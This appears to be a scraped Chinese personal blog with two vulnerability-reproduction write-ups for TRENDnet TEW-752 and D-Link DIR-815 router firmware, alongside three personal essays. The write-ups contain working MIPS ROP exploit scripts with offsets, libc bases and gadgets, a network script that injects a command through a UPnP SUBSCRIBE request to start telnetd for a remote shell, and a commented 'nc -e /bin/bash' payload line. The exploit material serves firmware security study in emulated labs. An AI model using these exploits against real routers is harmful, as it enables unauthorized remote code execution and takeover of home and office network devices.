[{"content":"前期准备\r固件下载链接：TEW752\n静态分析\r根据漏洞通报里的描述，漏洞存在于cgibin程序的genacgi_main函数，把cgibin放到IDA里分析\n函数比较简单，可能存在漏洞的点只能是在两个if的分支判断里，在request_method为UNSUBSCRIBE时，可以看到sprintf这个危险函数是没有进行长度检查的，并且v2(HTTP_SID)以及a1(SERVICE)都是可控的，可以注入恶意数据利用漏洞。\n但是，在路由器的文件系统中却并没有gena.cgi文件，所以不能通过qemu用户模式模拟来复现\n同时，在文件系统中搜索gena.cgi，除了cgibin程序就是几个web层面的php文件\n分析几个php文件，defnodes文件夹下的几个php文件只是设置事件订阅的URL，在httpsvcs.php文件中可以看到gena.cgi和UPNP服务有关：\n并且upnpsetup函数会在接收请求后创建gena.cgi等文件，upnpsetup函数中还可以看到，可以通过49152端口向UPNP发送数据：\n考虑构造一个特定的HTTP UNSUBSCRIBE请求，其中包含足够长的数据，使得 sprintf 函数写入超过 v5 （512）缓冲区的范围，从而触发栈溢出。\n模拟路由器环境\n构造HTTP请求（溢出HTTP_SID/SERVICE）\nTCP scoket来发送请求\n路由器模拟\r使用FirmAE工具进行路由器固件的模拟。注意：FirmAE的安装需要走代理——Ubuntu里开代理或者主机Windows开全局代理模式，并且初次模拟固件时间较长，可能会误以为模拟失败。\n动态调试\r1 测偏移\r先用cyclic 2000 \u0026gt; test生成测试字符到test文件，再用如下脚本启动qemu用户模式\n1 2 3 4 5 #!/bin/bash service=\u0026#34;?service=`cat test`\u0026#34; qemu-mipsel-static -L ./ -g 1234 -0 \u0026#34;gena.cgi\u0026#34; -E REQUEST_METHOD=\u0026#34;UNSUBSCRIBE\u0026#34; -E REQUEST_URI=$service -E HTTP_SID=1 -E SERVER_ID=LAN-3 -E REMOTE_ADDR=\u0026#34;192.168.182.14\u0026#34; ./htdocs/cgibin 使用gdb连接上之后，直接c，让其溢出，然后可以测得偏移为474\n2 找基址\r由于使用vmmap命令无法得到libc的基址\n所以，这里仍然根据延迟绑定机制来计算libc的基址\n0x3ff8a060 - 0x52060 = 0x3ff38000\n所以vmmap查看得到的，\u0026lt; explored \u0026gt;文件就是libc的基址\n3 找gadget\r考虑利用system函数来得到shell\n1 mipsrop.stackfinder() 选择0x16824处的gadget\n$sp + 0x10传给$s5，在0x16838处又赋值给$a0，$a0作为函数传参的寄存器，要存放cmd\n跳转$s0。\n仍然需要防止坏字符00，所以找对$s0操作的gadget\n观察溢出函数处\n1 mipsrop.find(\u0026#34;addiu $s0\u0026#34;) $s1放上一个gadget\n$0 放system地址\n$ra 返回地址放第二个gadget\n本地利用\r根据测得的偏移和找到的基址以及gadget，编写exp如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 # python3 from pwn import * context.endian = \u0026#34;little\u0026#34; context.arch = \u0026#34;mips\u0026#34; base_addr = 0x3ff38000 system_addr_1 = 0x53200-1 gadget1 = 0x16824 gadget2 = 0x32a98 padding = b\u0026#39;A\u0026#39; * 0x1ce padding += p32(base_addr + system_addr_1) # s0 padding += p32(base_addr + gadget1 ) # s1 padding +=b\u0026#39;a\u0026#39;*4 # s2 padding += p32(base_addr + gadget2) # ra padding += b\u0026#39;B\u0026#39; * 0x10 padding += b\u0026#39;/bin//sh\u0026#39; f = open(\u0026#34;exploit\u0026#34;,\u0026#39;wb+\u0026#39;) f.write(padding) f.close() 用start.sh脚本启动模拟，gdb连接上之后不用下断点，直接c，成功得到shell\n模拟环境利用\r首先使用固件模拟工具FirmAE进行固件的模拟\n然后直接运行以下exp：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import socket import os from time import sleep server = \u0026#39;192.168.10.1\u0026#39; port = 49152 shell = \u0026#39;`telnetd -p 8888 \u0026amp;`\u0026#39; con = socket.socket(socket.AF_INET, socket.SOCK_STREAM) request = \u0026#34;SUBSCRIBE /gena.cgi?service=\u0026#34; + str(shell) + \u0026#34; HTTP/1.0\\n\u0026#34; request += \u0026#34;Host: \u0026#34; + str(server) + str(port) + \u0026#34;\\n\u0026#34; request += \u0026#34;Callback: \u0026lt;http://192.168.0.4:34033/ServiceProxy27\u0026gt;\\n\u0026#34; request += \u0026#34;NT: upnp:event\\n\u0026#34; request += \u0026#34;Timeout: Second-1800\\n\u0026#34; request += \u0026#34;Accept-Encoding: gzip, deflate\\n\u0026#34; request += \u0026#34;User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\\n\\n\u0026#34; sleep(1) con.connect((socket.gethostbyname(server),port)) con.send(request.encode()) results = con.recv(4096) sleep(3) print(\u0026#34;sucess\u0026#34;) os.system(\u0026#39;telnet \u0026#39; + str(server) + \u0026#39; 8888\u0026#39;) 可以成功获得shell\n","date":"2024-09-04T16:42:46+08:00","permalink":"https://zhu1ang.github.io/p/tew752/","title":"TEW752"},{"content":"​ 初，余年十三学于鲁南。其地僻物薄，学子之数不可数也，诸君皆寒窗熬烛无敢懈者。彼时诸学子岁未及束发而负千钧之重，日日惶恐，时时叹息，唯恐力不尽心而有所辜负万一。又，余家贫无可供玩乐消遣者，困顿之意无从消处，唯武侠小说数本可略自娱。\n​ 当是时，偶读《多情剑客无情剑》便深叹服，迷恋不能自已，从此真如“一入江湖深似海”。三年之间，古龙先生数十作品皆一一拜读，然意犹未尽，故又日夜捧读金庸先生之作，更是别有一番滋味。江湖豪情，儿女情长，甚合余少年心境，每每念及，必心驰神往。\n​ 而后，三年之期以备高考之事至。平素课业压力之大，犹如枯木支撑泰山、土堤拦断江河，倾塌崩溃只在一瞬之间。其压迫之感，呼吸尚不能遑论自娱哉？于是诸侠义小说皆不得已搁置，恍恍惚三年，身处其中不觉岁月之快只觉年岁之苦，霎时间三年往事烟消云散方如梦初醒，故人离别、旧事尘封，再回首已是物是人非。\n​ 又数年，余历经人生之起落，就中苦乐曲折实非片语只字可叙一二，唯叹情之一事，无可奈何。当时心境无一丝少年侠气，是为飘渺虚妄年岁，思量到处，不敢回首，不甘回首。\n​ 而今忽有一剧名为《金庸武侠世界》，略观之，少年旧事忽如春风过水，万层涟漪攒入心头，于是重拾武侠小说，再品江湖风流。\n","date":"2024-09-04T16:41:33+08:00","permalink":"https://zhu1ang.github.io/p/%E6%B1%9F%E6%B9%96%E6%9D%82%E8%B0%88/","title":"江湖杂谈"},{"content":"1 环境准备\r固件下载链接：DLink下载\n物理机：Ubuntu 20.04 （需安装binwalk、qemu、pwntools等）\n反汇编共工具：IDA Pro\n2 静态分析\r根据已有的资料，DIR-815多重栈溢出漏洞和前端的超长cookie有关，并且漏洞文件为 hedweb.cgi\n首先对固件进行解包\n1 binwalk -Me xxx.bin 找到漏洞文件路径：/htdocs/web/hedwig.cgi\n是/htdocs/cgibin的软链接，因此，使用IDA逆向分析cgibin\n在main函数中可以看到，此处为hedwigcgi_main函数分支\n另外根据cgi-bin的架构和常用的变量，若要操作cookie，需使用getenv(\u0026quot;HTTP_COOKIE\u0026quot;)\n直接搜索\u0026quot;HTTP_COOKIE\u0026quot;字符串，根据交叉引用，只有sess_get_uid这个函数使用了这 个字符串\n继续通过交叉引用回溯，发现在hedwigcgi_main调用了这个函数\n并且两次调用了sprintf这个危险函数，两次拼接使用的字符串都是sess_get_uid处理之后的v4，分析sess_get_uid函数可知，v4是COOKIE中的uid的值。\n如果能走到第二个sprintf函数，则会覆盖上一次拼接的内容，则第二处sprintf是溢出点\n两个判断需要满足的条件为：存在/var/tmp 目录以及环境变量REQUEST_URI不为空。\n由于固件解包后不存在/var/tmp目录，故需要自己创建，否则后续测试偏移时由于无法走到第二个sprintf函数会出错。\n3 动态调试\r3.1 qemu用户模式复现\r1 2 3 4 5 6 7 8 9 #!/bin/sh INPUT=\u0026#34;uid=1234\u0026#34; TEST=\u0026#34;uid=1234`cat payload`\u0026#34; LEN=$(echo -n \u0026#34;INPUT\u0026#34; |wc -c) PORT=\u0026#34;1234\u0026#34; cd ./squashfs-root cp $(which qemu-mipsel-static) ./qemu echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE=\u0026#34;application/x-www-form-urlencoded\u0026#34; -E REQUEST_METHOD=\u0026#34;POST\u0026#34; -E HTTP_COOKIE=$TEST -E REQUEST_URI=\u0026#34;/hedwig.cgi\u0026#34; -g $PORT /htdocs/web/hedwig.cgi rm -f ./qemu 用以上脚本启动qemu模拟CGI程序，其中\ncyclic 2000生成2000字符作为payload -E 选项添加环境变量即HTTP_COOKIE等 使用以下命令启动\n1 2 3 4 sudo ./local.sh #启动调试脚本 gdb-multiarch ./squashfs-root/htdocs/cgibin #多架构gdb调试 target remote 127.0.0.1:1234 b *ret_addr #在hedwigcgi_main函数返回处下断点 可以看到返回地址$ra已经被覆盖了\n测得偏移为1009\n接下来就是获取基地址：\nvmmap命令查看，很大概率会因为gdb版本问题导致命令执行无效 libc函数地址 - 偏移 = 基地址，延迟绑定特性、write、puts泄露等 读取程序的 /proc/self/maps来获取与程序相关的基地址 第一个LOAD段中包含了共享库的代码段，其权限为r-xp，因此可以使用 ret2call，去调用system函数因此需要获取基地址\n通过延迟绑定机制计算基地址：\n基地址 = 0x7f76ca20 - 0x34a20 = 0x7f738000\n接下来的工作就是构造ROP链\n一般的x86的栈溢出可以直接覆盖返回地址与参数，但是MIPS的前四个参数是通过寄存器传递的，故不能直接覆盖栈来实现诸如system('cmd')的执行。\nMIPS架构栈溢出特性：\n1分支延迟，例如跳转指令在跳转地址填充后，跳转之前，会先执行跳转指令的下一条指令 2缓存不一致，指令缓存区（Instruction Cache）和数据缓存区（Data Cache）两者的同步需要时间，即栈上写入的指令并不是立即可以执行的 注意：system的地址为0x0053200，结尾是\u0026rsquo;x00/\u0026rsquo;，在sprintf函数拼接payload过程中会被截断，故此处考虑写入 system_addr - 1，再使用addiu \u0026hellip; , 1 的gadget还原后再跳转\n通过IDA的mipsrop插件执行mipsrop.stackfinder(),找到0x159cc的gadget，这个gadget的作用是跳转$s0，并把$s5的值赋给$a0，也就是第一个参数寄存器。\n通过mipsrop.find(\u0026quot;addiu $s0 , 1\u0026quot;)找到第二个还原system_addr的gadget\n根据函数结束处的栈布局以及两个gadget进行ROP链的组装，得到exp如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 from pwn import * context.arch = \u0026#39;mips\u0026#39; context.endian = \u0026#39;little\u0026#39; libc_base = 0x7F738000 system_offset = 0x53200-1 gadget1 = 0x159cc gadget2 = 0x158C8 #cmd = b\u0026#34;nc -e /bin/bash 9999\u0026#34; cmd = b\u0026#34;/bin/sh\u0026#34; data = b\u0026#34;a\u0026#34;*(1009 - 36) data += p32(libc_base+system_offset) #s0 data += b\u0026#34;bbbb\u0026#34; #s1 data += b\u0026#34;cccc\u0026#34; #s2 data += b\u0026#34;dddd\u0026#34; #s3 data += b\u0026#34;eeee\u0026#34; #s4 data += p32(libc_base+gadget1) #s5 # addiu $s5, $sp, 0x10 # move $a1, $s3 # move $a2, $s1 # move $t9, $s0 # jalr $t9 # move $a0, $s5 data += b\u0026#34;ffff\u0026#34; #s6 data += b\u0026#34;gggg\u0026#34; #s7 data += b\u0026#34;aaaa\u0026#34; #fp data += p32(libc_base+gadget2) #ra # move $t9, $s5 # jalr $t9 # addiu $s0, 1 data += b\u0026#34;b\u0026#34;*0x10 data += cmd f=open(\u0026#34;payload\u0026#34;,\u0026#34;wb\u0026#34;) f.write(data) f.close() 调试过程可以看出ROP链的构造没有问题，但是用户模式却无法打通，参考网上博客是这里system函数中有调用fork()函数，而用户模式是不支持多线程的，这里fork()的失败，会导致后面$fp是个空指针，就会出错。\n故此处应使用ROP+shellcode方法\nexp：\n3.2 qemu系统模式复现\r用户模式（User Mode）： 用户模式通常指的是在操作系统的用户空间下运行的程序或进程。在这种模式下，QEMU 可以模拟一个用户级别的环境，但不会涉及到底层的硬件操作或系统调用。 在用户模式下，程序的运行受到操作系统的隔离和限制，无法直接访问硬件设备或执行系统级操作。 系统模式（System Mode）： 系统模式，也称为\u0026quot;全系统仿真\u0026quot;（Full System Emulation），指的是 QEMU 模拟整个计算机系统，包括 CPU、内存、硬盘、网络设备等硬件组件。 在这种模式下，QEMU 可以运行完整的操作系统镜像，允许用户像在真实硬件上一样启动和使用操作系统。 系统模式提供了更接近真实环境的测试和开发平台，适用于操作系统开发、硬件兼容性测试、安全研究等场景。 两者的主要区别在于仿真的范围和深度：\n用户模式更侧重于应用程序层面的仿真，适用于开发和测试应用程序。 系统模式提供了更全面的仿真环境，包括硬件和操作系统层面，适用于底层开发和系统级测试。 3.2.1 配置qemu网络设置\r首先需要下载qemu虚拟机镜像文件：[qemu mips](Index of /~aurel32/qemu (debian.org))\n然后使用启动脚本启动qemu虚拟机，并配置网络\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 #! /bin/sh echo \u0026#34;config net\u0026#34; # 1 # 这两句不能断开 brctl addbr br0 #ifconfig br0 up # or ip link set br0 up # 2 brctl addif br0 ens33 #ifconfig ens33 0.0.0.0 # or ip addr add 0.0.0.0 dev ens33 # 3 dhclient br0 # 4 tunctl -t tap0 -u `whoami` #ifconfig tap0 up # or ip link set tap0 up brctl addif br0 tap0 # 5 echo \u0026#34;qemu start \u0026#34; sudo qemu-system-mipsel -M malta -kernel ./vmlinux-3.2.0-4-4kc-malta -hda ./debian_squeeze_mipsel_standard.qcow2 -append \u0026#34;root=/dev/sda1 console=tty0\u0026#34; -net nic -net tap,ifname=tap0,script=no,downscript=no -nographic 等待启动完成，qemu的默认登录为：root/root，登录后使用ifconfig查看网卡信息——如果此时eth0网卡存在但没有IP，可以使用ifconfig eth0 ip/24 up手动分配ip，注意要和宿主机在同一网卡下。\n互相测试能否ping通\n3.2.2 上传固件\r需要在qemu虚拟机使用chroot切换根目录，并执行shell，因此需要将物理机中解压出来的文件系统上传到qemu虚拟机中。\n1 scp -r squashfs-root/ root@qemu_IP:/path/ 3.2.3开启httpd服务\r在qemu虚拟机的squashfs-root目录下新建一个http_conf配置文件，里面写入（注意修改49行的ip）：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 Umask 026 PIDFile /var/run/httpd.pid LogGMT On #开启log ErrorLog /log #log文件 Tuning { NumConnections 15 BufSize 12288 InputBufSize 4096 ScriptBufSize 4096 NumHeaders 100 Timeout 60 ScriptTimeout 60 } Control { Types { text/html { html htm } text/xml { xml } text/plain { txt } image/gif { gif } image/jpeg { jpg } text/css { css } application/octet-stream { * } } Specials { Dump { /dump } CGI { cgi } Imagemap { map } Redirect { url } } External { /usr/sbin/phpcgi { php } } } Server { ServerName \u0026#34;Linux, HTTP/1.1, \u0026#34; ServerId \u0026#34;1234\u0026#34; Family inet Interface eth0 #对应qemu仿真路由器系统的网卡 Address 192.168.182.6 #qemu仿真路由器系统的IP Port \u0026#34;1234\u0026#34; #对应未被使用的端口 Virtual { AnyHost Control { Alias / Location /htdocs/web IndexNames { index.php } External { /usr/sbin/phpcgi { router_info.xml } /usr/sbin/phpcgi { post_login.xml } } } Control { Alias /HNAP1 Location /htdocs/HNAP1 External { /usr/sbin/hnap { hnap } } IndexNames { index.hnap } } } } 3.2.4开启物理机转发功能\r在宿主机中新建以下net_conf_host.sh脚本并执行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #! /bin/sh sudo sysctl -w net.ipv4.ip_forward=1 sudo iptables -F sudo iptables -X sudo iptables -t nat -F sudo iptables -t nat -X sudo iptables -t mangle -F sudo iptables -t mangle -X sudo iptables -P INPUT ACCEPT sudo iptables -P FORWARD ACCEPT sudo iptables -P OUTPUT ACCEPT sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT 之后，再在qemu虚拟机的squashfs-root目录下创建init.sh的脚本进行初始化操作：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #!/bin/bash echo 0 \u0026gt; /proc/sys/kernel/randomize_va_space cp http_conf / cp sbin/httpd / cp -rf htdocs/ / mkdir /etc_bak cp -r /etc /etc_bak rm /etc/services cp -rf etc/ / cp lib/ld-uClibc-0.9.30.1.so /lib/ cp lib/libcrypt-0.9.30.1.so /lib/ cp lib/libc.so.0 /lib/ cp lib/libgcc_s.so.1 /lib/ cp lib/ld-uClibc.so.0 /lib/ cp lib/libcrypt.so.0 /lib/ cp lib/libgcc_s.so /lib/ cp lib/libuClibc-0.9.30.1.so /lib/ cd / rm -rf /htdocs/web/hedwig.cgi rm -rf /usr/sbin/phpcgi rm -rf /usr/sbin/hnap ln -s /htdocs/cgibin /htdocs/web/hedwig.cgi ln -s /htdocs/cgibin /usr/sbin/phpcgi ln -s /htdocs/cgibin /usr/sbin/hnap ./httpd -f http_conf 通过以下命令切换根目录\n1 2 3 mount -o bind /dev ./squashfs-root/dev/ mount -t proc /proc/ ./squashfs-root/proc/ chroot squashfs-root bash 但是squashfs-root目录下并无bash，静态编译一个mips架构的bash放进去。\n如果报错没有PID文件，自己手动创建一个文件，只要PID不和已有的重复就行。\n最后，启动init.sh脚本，开启httpd服务\n此时在物理机中访问 qemu_IP/hedwig.cgi，如图：\n出现上图，则说明配置成功。最后，退出qemu虚拟机的时候，运行fin.sh的脚本恢复/etc文件夹,否则后续qemu会打不开：\n1 2 3 4 #!/bin/bash rm -rf /etc mv /etc_bak/etc /etc rm -rf /etc_bak 3.2.5 复现\r​ 在物理机上运行exp.py，将静态编译的gdbserver、生成的payload上传到qemu虚拟机中。\n注：系统模式和用户模式的基址可能是不同的\n执行以下脚本启动gdbserver调试\n1 2 3 4 5 6 7 8 9 10 11 export CONTENT_LENGTH=\u0026#34;100\u0026#34; export CONTENT_TYPE=\u0026#34;application/x-www-form-urlencoded\u0026#34; export HTTP_COOKIE=\u0026#34;uid=`cat payload`\u0026#34; export REQUEST_METHOD=\u0026#34;POST\u0026#34; export REQUEST_URI=\u0026#34;/hedwig.cgi\u0026#34; echo \u0026#34;uid=1234\u0026#34;|./gdbserver.mipsle 192.168.182.12:6666 /htdocs/web/hedwig.cgi #unset CONTENT_LENGTH #unset CONTENT_TYPE #unset HTTP_COOKIE #unset REQUEST_METHOD #unset REQUEST_URI 直接在虚拟机里启动该脚本，物理机启动一个端口监听，gdb连接上直接c即可获得shell\n附录\r参考文献\rhttps://bbs.kanxue.com/thread-272318.htm#msg_header_h3_8\nhttps://bbs.kanxue.com/thread-263758.htm\n","date":"2024-09-04T16:37:49+08:00","permalink":"https://zhu1ang.github.io/p/dir815/","title":"DIR815漏洞复现"},{"content":"​\t农历甲辰龙年七月初七，七夕，是为神仙眷侣期年相会之日，故民俗或借之以思旧、或以慕新。 余孑然一身，假期方尽，匆匆南下赴金陵求学。路途旅人数千，形形色色，皆疲于车马风尘，无暇他顾。 ​\t佳节美好良缘在众生亦不在众生。余与世间众旅人碍于路途遥遥心中烦闷，而无二意，是为不在众生。然，路远而终有尽头，彼时胡不可斟酒疏解心事、思恋佳人哉？或有人共度七夕者，则更效神仙事也。此是为在众生也。 ​\t凡世不仁亦当如此心境，可凌困苦而观前路光明者，方能不困于心不固于情。 感慨之余，余思衬毕竟七夕，不可枉费郎女会于鹊桥之美景也。于是余放胆祈求，月仙红线何时再缚余之心头？\n","date":"2024-09-04T16:33:50+08:00","permalink":"https://zhu1ang.github.io/p/%E4%B8%83%E5%A4%95%E9%9A%8F%E7%AC%94/","title":"七夕随笔"},{"content":"​\t余求学于金陵某学府，攻读硕士之业。吾自知才浅学疏，网安之事弗知一二，故无所求但期遇一明师指点一二使吾不致枉费十数年求学之功也。\n​\t然世事无常，人事多艰，吾虽再三思量却终身陷囹圄。吾所从之师，其形貌似人而所行之事比之狼豺野狗更甚。其平素不示以难，不指以困，反责吾等劳作之量甚微未及其预期也。更甚者，酬饷必延半载而后放，且斤斤计较、锱铢必较，师生之情全如商旅之事耳。暑假期间，犹命吾等加班不息，且督促倍加，以促进度。呜呼哀哉，是为吾与诸同窗之大不幸！\n​\t然余志在自强，冀望凭己绵薄之力，精一二之计术，辅日后之工作矣。此间所录，乃余学习之笔记，望能时时温故，悟新理，日新月异，以期小流积之成海、沙砾类之成山。顽石历经千磨虽不能成玉，然必有玉珏圆润清朗之光泽也。其中亦有吾之杂感随笔，权且聊以自娱，消磨闲暇，贻笑大方，深自惴惴。\n","date":"2024-09-04T16:14:47+08:00","permalink":"https://zhu1ang.github.io/p/%E8%87%AA%E9%93%AD%E5%BF%97/","title":"自铭志"}]